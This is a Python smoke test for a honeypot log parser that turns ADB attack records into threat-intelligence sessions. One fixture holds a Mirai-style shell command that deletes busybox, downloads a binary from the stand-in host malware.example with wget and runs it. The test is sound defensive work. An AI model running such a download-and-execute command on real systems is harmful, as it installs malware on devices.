"""Smoke test for the adbhoney parser (migrated from its old
`if __name__` block so CI runs it). Generic parse/correlate/
STIX contract is covered in test_parsers.py."""
from __future__ import annotations

import tpot2cti.parsers.adbhoney as _m
globals().update({k: v for k, v in vars(_m).items() if not k.startswith('__')})


def test_adbhoney_smoke():
    from datetime import datetime, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = AdbhoneyParser()
    now = datetime.now(timezone.utc)

    # ── Case 1: "drive-by" — bare ADB probe, no command, no upload ─────
    # Per the spec ADB-on-5555 is inherently malicious.  The smoke test
    # verifies the bare probe still parses/correlates cleanly even with
    # no command / no data.
    bare_probe_doc = {
        "@timestamp": now.isoformat(),
        "type": "Adbhoney",
        "src_ip": "203.0.113.13",
        "src_port": 50200,
        "dst_port": 5555,
        "t-pot_hostname": "node1",
        "geoip": {"country_iso_code": "VN", "country_name": "Vietnam"},
    }

    # ── Case 2: substantive — Mirai-style binary drop + shell command ──
    substantive_doc = {
        "@timestamp": now.isoformat(),
        "type": "Adbhoney",
        "src_ip": "198.51.100.77",
        "src_port": 33444,
        "dst_port": 5555,
        "t-pot_hostname": "node1",
        "command": (
            "cd /data/local/tmp/ && rm -rf busybox && "
            "wget http://malware.example/arm7 -O arm7 && chmod 777 arm7 && ./arm7"
        ),
        "data_sha256": "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
        "device_serial": "fake-serial-123",
        "device_model": "Pixel-emul",
        "geoip": {
            "country_iso_code": "RU",
            "country_name": "Russia",
            "asn": 12345,
            "organization": "ExampleNet",
        },
    }

    bare_event = parser.parse(bare_probe_doc)
    subs_event = parser.parse(substantive_doc)
    assert bare_event and subs_event, "parse failed"

    bare_session = parser.correlate([bare_event])[0]
    subs_session = parser.correlate([subs_event])[0]

    # The substantive session must carry the sha256 + command in
    # aggregates, plus device-info in meta.
    assert subs_session.malware_hashes == [
        "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899"
    ], f"expected sha256 promoted; got {subs_session.malware_hashes}"
    assert subs_session.commands and "wget" in subs_session.commands[0], (
        f"expected wget command in session.commands; got {subs_session.commands}"
    )
    assert subs_session.meta.get("device_model") == "Pixel-emul"

    # Bare probe must have neither hashes nor commands.
    assert bare_session.malware_hashes == []
    assert bare_session.commands == []

    print("OK")
